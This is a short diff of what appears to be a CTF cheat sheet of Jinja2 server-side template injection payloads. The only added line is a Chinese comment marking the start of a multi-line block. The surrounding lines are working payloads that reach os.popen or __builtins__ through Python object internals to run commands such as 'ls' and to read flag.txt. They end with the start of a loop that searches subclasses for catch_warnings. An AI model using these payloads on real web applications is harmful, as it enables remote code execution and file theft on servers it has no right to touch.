@@ -206,6 +206,7 @@ lipsum               {{lipsum.__globals__['os']['popen']('ls').read()}}
 # others
 {{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag.txt').read()")}}
 {{''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__'].open("flag.txt").read()}}
+# 以下是一个整体
 {% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
 {% for b in c.__init__.__globals__.values() %}
